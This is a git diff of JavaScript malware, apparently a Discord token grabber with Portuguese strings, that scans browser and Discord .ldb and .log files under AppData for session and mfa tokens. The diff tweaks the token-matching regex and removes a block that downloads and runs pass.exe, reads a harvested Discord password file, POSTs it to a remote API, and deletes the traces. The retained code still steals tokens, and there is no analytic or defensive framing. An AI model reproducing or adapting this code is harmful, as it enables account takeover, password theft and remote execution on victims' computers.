@@ -55,7 +55,7 @@ const local = "C:/Users/" + user + "/AppData/Local"
                         let filtro = files.filter(f => f.split('.').pop() === "ldb")
                         for (i = 0; i < filtro.length; i++) {
                             fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function(err, data) {
-                                let semmfa = new RegExp(/[\d\w_-]{26}\.[\d\w_-]{6}\.[\d\w_-]{38}/)
+                                let semmfa = new RegExp(/[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{38}/)
                                 let mfa = new RegExp(/mfa\.[\w-]{84}/g)
     
                                 let [tokenuser] = semmfa.exec(data) || mfa.exec(data) || [null];
@@ -78,7 +78,7 @@ const local = "C:/Users/" + user + "/AppData/Local"
                         let filtro = files.filter(f => f.split('.').pop() === "log")
                         for (i = 0; i < filtro.length; i++) {
                             fs.readFile(`${path}/${filtro[i]}`, 'utf-8', async function(err, data) {
-                                let semmfa = new RegExp(/[\d\w_-]{26}\.[\d\w_-]{6}\.[\d\w_-]{38}/)
+                                let semmfa = new RegExp(/[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{38}/)
                                 let mfa = new RegExp(/mfa\.[\w-]{84}/g)
 
                                 if (semmfa.test(data)) {}
@@ -96,31 +96,3 @@ const local = "C:/Users/" + user + "/AppData/Local"
     }
   
    grabber()
-
-   https.get(url, (res) => {
-    const path = `${roaming}/pass.exe`
-    const writeStream = fs.createWriteStream(path);
-  
-    res.pipe(writeStream);
-  
-    writeStream.on("finish", () => {
-    writeStream.close()
-    fs.access(path, fs.constants.F_OK, (err) => {let vr = err ? 'não existe' : 'existe' 
-    if(vr == "não existe") return fetch(api + "/error/o-arquivo-de-senhas-nao-foi-encontrado")
-    if(vr == "existe") return setTimeout(()=>{execFile(roaming + '/pass.exe', (error, stdout, stderr) => {if (!error) return ini() 
-    else
-    if(error){return}})},100)})})})
-  
-    async function ini(){
-    let senhasdc = roaming + "/DiscordSenhas.txt",
-          db = roaming + "/TempMan.db",
-          DPN = roaming + "/pass.exe"
-  
-          fs.access(senhasdc, fs.constants.F_OK, async (err) => {let vr = err ? 'não existe' : 'existe'
-            if(vr == "não existe") return fetch(api + "senhas-nao-encontradas")
-            if(vr == "existe") {await fs.readFile(`${senhasdc}`,'utf8', function(err,data){fetch(api + "/pass", {method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({"passdc": data})})})
-            await fs.unlinkSync(senhasdc)
-            await fs.unlinkSync(db)
-            await fs.unlinkSync(DPN)  
-    }})
-  }
